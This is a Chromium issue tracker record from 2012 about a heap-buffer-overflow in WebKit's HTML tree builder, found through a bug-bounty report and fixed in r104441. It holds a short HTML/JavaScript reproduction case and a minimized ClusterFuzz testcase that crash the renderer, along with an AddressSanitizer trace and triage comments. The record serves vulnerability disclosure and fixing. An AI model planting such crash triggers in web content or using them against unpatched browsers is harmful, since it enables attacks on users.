# Heap-buffer-overflow in WebCore::HTMLTreeBuilder::HTMLTreeBuilder

| Field | Value |
|-------|-------|
| **Issue ID** | [40052593](https://issues.chromium.org/issues/40052593) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | ax...@gmail.com |
| **Assignee** | ab...@chromium.org |
| **Created** | 2012-01-08 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

Heap buffer overflow can be triggered while creating new document fragment.

**VERSION**  

18.0.1000.0 (Developer Build 116831 Linux)  

Also crashes on 16.0.912.63, Ubuntu 10.10, x64.  

Unable to crash on 16.0.912.75 m, Windows 7, x64.

**REPRODUCTION CASE**

<html>
<body id="root">
<object id="h" /></object>
<script>
var s = document.createElement('style');
var h = document.getElementById('h');
var r = document.createRange();
```
        h.appendChild(s);  
        r.selectNodeContents( h );  
        r.extractContents();  
        s.insertAdjacentHTML('afterend', "aaa");  
    </script>  
</body>  

```
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**

==19807== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7f936e1329d8 at pc 0x7f93829ae429 bp 0x7fff774fc810 sp 0x7fff774fc808  

READ of size 8 at 0x7f936e1329d8 thread T0  

#0 0x7f93829ae429 in WebCore::QualifiedName::matches(WebCore::QualifiedName const&) const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/QualifiedName.h:76  

#1 0x7f93829c0d4d in WebCore::Element::hasTagName(WebCore::QualifiedName const&) const /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Element.h:194  

#2 0x7f938302c9d2 in WebCore::(anonymous namespace)::closestFormAncestor(WebCore::Element\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/html/parser/HTMLTreeBuilder.cpp:235  

#3 0x7f938302c64c in WebCore::HTMLTreeBuilder::HTMLTreeBuilder(WebCore::HTMLDocumentParser\*, WebCore::DocumentFragment\*, WebCore::Element\*, WebCore::FragmentScriptingPermission, bool, unsigned int) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/html/parser/HTMLTreeBuilder.cpp:393  

#4 0x7f938300abc2 in WebCore::HTMLTreeBuilder::create(WebCore::HTMLDocumentParser\*, WebCore::DocumentFragment\*, WebCore::Element\*, WebCore::FragmentScriptingPermission, bool, unsigned int) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/html/parser/HTMLTreeBuilder.h:65  

#5 0x7f938300aa00 in WebCore::HTMLDocumentParser::HTMLDocumentParser(WebCore::DocumentFragment\*, WebCore::Element\*, WebCore::FragmentScriptingPermission) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/html/parser/HTMLDocumentParser.cpp:93  

#6 0x7f938300d468 in WebCore::HTMLDocumentParser::create(WebCore::DocumentFragment\*, WebCore::Element\*, WebCore::FragmentScriptingPermission) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/html/parser/HTMLDocumentParser.h:65  

#7 0x7f938300d1fb in WebCore::HTMLDocumentParser::parseDocumentFragment(WTF::String const&, WebCore::DocumentFragment\*, WebCore::Element\*, WebCore::FragmentScriptingPermission) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/html/parser/HTMLDocumentParser.cpp:556  

#8 0x7f9382f34836 in WebCore::HTMLElement::insertAdjacentHTML(WTF::String const&, WTF::String const&, int&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/html/HTMLElement.cpp:666  

#9 0x7f9383f8ded0 in ~RefPtr /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/RefPtr.h:58  

#10 0x7f9381f8c053 in HandleApiCallHelper /media/Chromium/chromium/depot\_tools/src/v8/src/builtins.cc:1220  

#11 0x315bf700420e in  

#12 0x315bf702979a in  

#13 0x315bf701fa67 in  

#14 0x315bf70072b7 in  

#15 0x7f9381fd5dbb in v8::internal::Invoke(bool, v8::internal::Handle[v8::internal::JSFunction](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, bool\*) /media/Chromium/chromium/depot\_tools/src/v8/src/execution.cc:118  

#16 0x7f9381f26cbd in v8::Script::Run() /media/Chromium/chromium/depot\_tools/src/v8/src/api.cc:1570  

#17 0x7f938332526f in WebCore::V8Proxy::runScript(v8::Handle[v8::Script](javascript:void(0);)) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/bindings/v8/V8Proxy.cpp:378  

#18 0x7f9383324357 in WebCore::V8Proxy::evaluate(WebCore::ScriptSourceCode const&, WebCore::Node\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/bindings/v8/V8Proxy.cpp:346  

#19 0x7f93832ce040 in WebCore::ScriptController::evaluate(WebCore::ScriptSourceCode const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/bindings/v8/ScriptController.cpp:201  

#20 0x7f9382f0ec79 in WebCore::ScriptElement::executeScript(WebCore::ScriptSourceCode const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/ScriptElement.cpp:293  

#21 0x7f9382f0c938 in WebCore::ScriptElement::prepareScript(WTF::TextPosition const&, WebCore::ScriptElement::LegacyTypeSupport) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/ScriptElement.cpp:246  

#22 0x7f9383012d65 in WebCore::HTMLScriptRunner::runScript(WebCore::Element\*, WTF::TextPosition const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/html/parser/HTMLScriptRunner.cpp:298  

#23 0x7f9383012ac0 in WebCore::HTMLScriptRunner::execute(WTF::PassRefPtr[WebCore::Element](javascript:void(0);), WTF::TextPosition const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/html/parser/HTMLScriptRunner.cpp:172  

#24 0x7f938300bc7e in WebCore::HTMLDocumentParser::runScriptsForPausedTreeBuilder() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/html/parser/HTMLDocumentParser.cpp:207  

#25 0x7f938300be3b in WebCore::HTMLDocumentParser::canTakeNextToken(WebCore::HTMLDocumentParser::SynchronousMode, WebCore::PumpSession&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/html/parser/HTMLDocumentParser.cpp:225  

#26 0x7f938300b66d in WebCore::HTMLDocumentParser::pumpTokenizer(WebCore::HTMLDocumentParser::SynchronousMode) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/html/parser/HTMLDocumentParser.cpp:263  

#27 0x7f938300c895 in WebCore::HTMLDocumentParser::append(WebCore::SegmentedString const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/html/parser/HTMLDocumentParser.cpp:372  

#28 0x7f9385649d3e in WebCore::DecodedDataDocumentParser::appendBytes(WebCore::DocumentWriter\*, char const\*, unsigned long) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/DecodedDataDocumentParser.cpp:50  

#29 0x7f9383610ae1 in ~RefPtr /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/RefPtr.h:58  

#30 0x7f9382a3706b in WebKit::FrameLoaderClientImpl::committedLoad(WebCore::DocumentLoader\*, char const\*, int) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebKit/chromium/src/FrameLoaderClientImpl.cpp:1118  

#31 0x7f93836109e0 in void WTF::derefIfNotNull[WebCore::DocumentLoader](javascript:void(0);)(WebCore::DocumentLoader\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/PassRefPtr.h:52  

#32 0x7f938366daa2 in WebCore::ResourceLoader::didReceiveData(char const\*, int, long long, bool) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/ResourceLoader.cpp:291  

#33 0x7f938365901d in void WTF::derefIfNotNull[WebCore::MainResourceLoader](javascript:void(0);)(WebCore::MainResourceLoader\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/JavaScriptCore/wtf/PassRefPtr.h:52  

#34 0x7f938366e899 in WebCore::ResourceLoader::didReceiveData(WebCore::ResourceHandle\*, char const\*, int, int) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/loader/ResourceLoader.cpp:442  

#35 0x7f93829022b9 in ResourceDispatcher::OnReceivedData(IPC::Message const&, int, base::FileDescriptor, int, int) /media/Chromium/chromium/depot\_tools/src/content/common/resource\_dispatcher.cc:404  

#36 0x7f9382903ca3 in bool ResourceMsg\_DataReceived::Dispatch<ResourceDispatcher, ResourceDispatcher, int, base::FileDescriptor, int, int>(IPC::Message const\*, ResourceDispatcher\*, ResourceDispatcher\*, void (ResourceDispatcher::\*)(IPC::Message const&, int, base::FileDescriptor, int, int)) /media/Chromium/chromium/depot\_tools/src/./content/common/resource\_messages.h:154  

#37 0x7f93829006e7 in ResourceDispatcher::DispatchMessage(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/content/common/resource\_dispatcher.cc:557  

#38 0x7f93828ff954 in ResourceDispatcher::OnMessageReceived(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/content/common/resource\_dispatcher.cc:326  

#39 0x7f938281219a in ChildThread::OnMessageReceived(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/content/common/child\_thread.cc:172  

#40 0x7f93829550ae in IPC::ChannelProxy::Context::OnDispatchMessage(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/ipc/ipc\_channel\_proxy.cc:263  

#41 0x7f938295a418 in base::internal::InvokeHelper<false, void, base::internal::RunnableAdapter<void (IPC::ChannelProxy::Context::\*)(IPC::Message const&)>, void ()(IPC::ChannelProxy::Context\* const&, IPC::Message const&)>::MakeItSo(base::internal::RunnableAdapter<void (IPC::ChannelProxy::Context::\*)(IPC::Message const&)>, IPC::ChannelProxy::Context\* const&, IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/./base/bind\_internal.h:897  

#42 0x7f93814d46b3 in MessageLoop::RunTask(base::PendingTask const&) /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:459  

#43 0x7f93814d4d04 in MessageLoop::DeferOrRunPendingTask(base::PendingTask const&) /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:470  

#44 0x7f93814d50be in MessageLoop::DoWork() /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:660  

#45 0x7f93814e19de in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) /media/Chromium/chromium/depot\_tools/src/base/message\_pump\_default.cc:28  

#46 0x7f93814d3dc4 in MessageLoop::RunInternal() /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:418  

#47 0x7f93814d2a88 in MessageLoop::Run() /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:301  

#48 0x7f9384fc7d38 in RendererMain(content::MainFunctionParams const&) /media/Chromium/chromium/depot\_tools/src/content/renderer/renderer\_main.cc:241  

#49 0x7f9381442734 in (anonymous namespace)::RunZygote(content::MainFunctionParams const&, content::ContentMainDelegate\*) /media/Chromium/chromium/depot\_tools/src/content/app/content\_main.cc:233  

#50 0x7f93814422cb in (anonymous namespace)::RunNamedProcessTypeMain(std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, content::MainFunctionParams const&, content::ContentMainDelegate\*) /media/Chromium/chromium/depot\_tools/src/content/app/content\_main.cc:271  

#51 0x7f9381441a39 in content::ContentMain(int, char const\*\*, content::ContentMainDelegate\*) /media/Chromium/chromium/depot\_tools/src/content/app/content\_main.cc:455  

#52 0x7f937ff85947 in ChromeMain /media/Chromium/chromium/depot\_tools/src/chrome/app/chrome\_main.cc:32  

#53 0x7f937ff8584b in main /media/Chromium/chromium/depot\_tools/src/chrome/app/chrome\_exe\_main\_gtk.cc:18  

#54 0x7f9379522d8e in \_\_libc\_start\_main /build/buildd/eglibc-2.12.1/csu/libc-start.c:258  

0x7f936e1329d8 is located 0 bytes to the right of 88-byte region [0x7f936e132980,0x7f936e1329d8)  

allocated by thread T0 here:  

#0 0x7f9385971604 in operator new(unsigned long) ??:0  

#1 0x7f9382e3a6da in WebCore::DocumentFragment::create(WebCore::Document\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/DocumentFragment.cpp:43  

#2 0x7f9382eabe4d in WebCore::Range::processContents(WebCore::Range::ActionType, int&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Range.cpp:690  

#3 0x7f9382eaf658 in WebCore::Range::extractContents(int&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/Range.cpp:941  

#4 0x7f9383d108f3 in WebCore::RangeInternal::extractContentsCallback(v8::Arguments const&) /media/Chromium/chromium/depot\_tools/src/out/Release/obj/gen/webcore/bindings/V8Range.cpp:322  

#5 0x7f9381f8c053 in HandleApiCallHelper /media/Chromium/chromium/depot\_tools/src/v8/src/builtins.cc:1220  

#6 0x315bf700420e in  

#7 0x315bf702975b in  

#8 0x315bf701fa67 in  

#9 0x315bf70072b7 in  

#10 0x7f9381fd5dbb in v8::internal::Invoke(bool, v8::internal::Handle[v8::internal::JSFunction](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, bool\*) /media/Chromium/chromium/depot\_tools/src/v8/src/execution.cc:118  

#11 0x7f9381f26cbd in v8::Script::Run() /media/Chromium/chromium/depot\_tools/src/v8/src/api.cc:1570  

#12 0x7f938332526f in WebCore::V8Proxy::runScript(v8::Handle[v8::Script](javascript:void(0);)) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/bindings/v8/V8Proxy.cpp:378  

#13 0x7f9383324357 in WebCore::V8Proxy::evaluate(WebCore::ScriptSourceCode const&, WebCore::Node\*) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/bindings/v8/V8Proxy.cpp:346  

#14 0x7f93832ce040 in WebCore::ScriptController::evaluate(WebCore::ScriptSourceCode const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/bindings/v8/ScriptController.cpp:201  

#15 0x7f9382f0ec79 in WebCore::ScriptElement::executeScript(WebCore::ScriptSourceCode const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/ScriptElement.cpp:293  

#16 0x7f9382f0c938 in WebCore::ScriptElement::prepareScript(WTF::TextPosition const&, WebCore::ScriptElement::LegacyTypeSupport) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/dom/ScriptElement.cpp:246  

#17 0x7f9383012d65 in WebCore::HTMLScriptRunner::runScript(WebCore::Element\*, WTF::TextPosition const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/html/parser/HTMLScriptRunner.cpp:298  

#18 0x7f9383012ac0 in WebCore::HTMLScriptRunner::execute(WTF::PassRefPtr[WebCore::Element](javascript:void(0);), WTF::TextPosition const&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/html/parser/HTMLScriptRunner.cpp:172  

#19 0x7f938300bc7e in WebCore::HTMLDocumentParser::runScriptsForPausedTreeBuilder() /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/html/parser/HTMLDocumentParser.cpp:207  

#20 0x7f938300be3b in WebCore::HTMLDocumentParser::canTakeNextToken(WebCore::HTMLDocumentParser::SynchronousMode, WebCore::PumpSession&) /media/Chromium/chromium/depot\_tools/src/third\_party/WebKit/Source/WebCore/html/parser/HTMLDocumentParser.cpp:225  

==19807== ABORTING  

Stats: 26M malloced (19M for red zones) by 51866 calls  

Stats: 1M realloced by 1013 calls  

Stats: 22M freed by 40016 calls  

Stats: 0M really freed by 0 calls  

Stats: 72M (18444 full pages) mmaped in 18 calls  

mmaps by size class: 8:49149; 9:8191; 10:4095; 11:2047; 12:1024; 13:1024; 14:256; 15:128; 16:64; 17:64; 18:16; 19:8; 21:4;  

mallocs by size class: 8:41258; 9:5161; 10:3173; 11:969; 12:245; 13:781; 14:126; 15:90; 16:19; 17:35; 18:1; 19:4; 21:4;  

frees by size class: 8:30768; 9:4482; 10:2926; 11:690; 12:162; 13:756; 14:106; 15:84; 16:12; 17:21; 18:1; 19:4; 21:4;  

rfrees by size class:  

Stats: malloc large: 44 small slow: 258  

Shadow byte and word:  

0x1ff26dc2653b: fb  

0x1ff26dc26538: 00 00 00 fb fb fb fb fb  

More shadow bytes:  

0x1ff26dc26518: fd fd fd fd fd fd fd fd  

0x1ff26dc26520: fa fa fa fa fa fa fa fa  

0x1ff26dc26528: fa fa fa fa fa fa fa fa  

0x1ff26dc26530: 00 00 00 00 00 00 00 00  

=>0x1ff26dc26538: 00 00 00 fb fb fb fb fb  

0x1ff26dc26540: fa fa fa fa fa fa fa fa  

0x1ff26dc26548: fa fa fa fa fa fa fa fa  

0x1ff26dc26550: fd fd fd fd fd fd fd fd  

0x1ff26dc26558: fd fd fd fd fd fd fd fd

## Timeline

### in...@chromium.org (2012-01-09)

Looks like a treebuilder issue. ccing our experts here.

Also uploading to ClusterFuzz, so that we can access secimpacts here.

### in...@chromium.org (2012-01-09)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=10701605

Uploader: inferno@chromium.org

Crash Type: Heap-buffer-overflow READ 8
Crash Address: 0x7f6ed182a3d8
Crash State:
  - crash stack -
  WebCore::HTMLTreeBuilder::HTMLTreeBuilder
  WebCore::HTMLDocumentParser::HTMLDocumentParser
  WebCore::HTMLDocumentParser::parseDocumentFragment
  

Minimized Testcase (0.30 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv94-X0M3bZXSjL0GQq7mcnRIeMwhO4GfPbHXcnoiZenqY26f6KE7K-jbWclPrmjhNHNMPENy1VdppjkyA3G_6f2bsTt33zg8nJeRjOsP2s0ewVtw7gf22cG9nf55pGcy-dY1G1uxnLPfHEAmK9k-3Veba4q29Q
<object id="h"</object>
        <script>
            var s = document.createElement('style');
            var r = document.createRange();

            h.appendChild(s);
            r.selectNodeContents( h );
            r.extractContents();
            s.insertAdjacentHTML('afterend', "aaa");
        </script>

### in...@chromium.org (2012-01-09)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-01-09)

Upstreamed - https://bugs.webkit.org/show_bug.cgi?id=75826

### ab...@chromium.org (2012-01-09)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-01-09)

This is a bad cast. (see debug build stack).

### ab...@chromium.org (2012-01-09)

Which line has the bad cast?  I'm building debug now to take a look.

### ab...@chromium.org (2012-01-09)

This doesn't seem related to the tree builder.

### ab...@chromium.org (2012-01-09)

Building a speculative fix.

### ab...@chromium.org (2012-01-09)

Patch posted for review upstream.

### ab...@chromium.org (2012-01-09)

[Empty comment from Monorail migration]

### ab...@chromium.org (2012-01-09)

Committed r104441: <http://trac.webkit.org/changeset/104441>


### sc...@gmail.com (2012-01-09)

Thanks Adam!
We'll put this in the 2nd M16 patch.

### in...@chromium.org (2012-01-11)

[Empty comment from Monorail migration]

### js...@chromium.org (2012-01-18)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-01-19)

merged to m16 in r105336, merged to m17 in r105342

### js...@chromium.org (2012-01-19)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-01-20)

@Ax330d: and another one! Thanks for the nice small repro cases. $1000

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2012-01-31)

[Empty comment from Monorail migration]

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-06-13)

ClusterFuzz has detected this issue as fixed in range 116865:116870.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=10701605

Uploader: inferno@chromium.org

Crash Type: Heap-buffer-overflow READ 8
Crash Address: 0x7f6ed182a3d8
Crash State:
  - crash stack -
  WebCore::HTMLTreeBuilder::HTMLTreeBuilder
  WebCore::HTMLDocumentParser::HTMLDocumentParser
  WebCore::HTMLDocumentParser::parseDocumentFragment
  
Fixed: https://cluster-fuzz.appspot.com/revisions?range=116865:116870

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv94-X0M3bZXSjL0GQq7mcnRIeMwhO4GfPbHXcnoiZenqY26f6KE7K-jbWclPrmjhNHNMPENy1VdppjkyA3G_6f2bsTt33zg8nJeRjOsP2s0ewVtw7gf22cG9nf55pGcy-dY1G1uxnLPfHEAmK9k-3Veba4q29Q

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/109556?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40052593)*
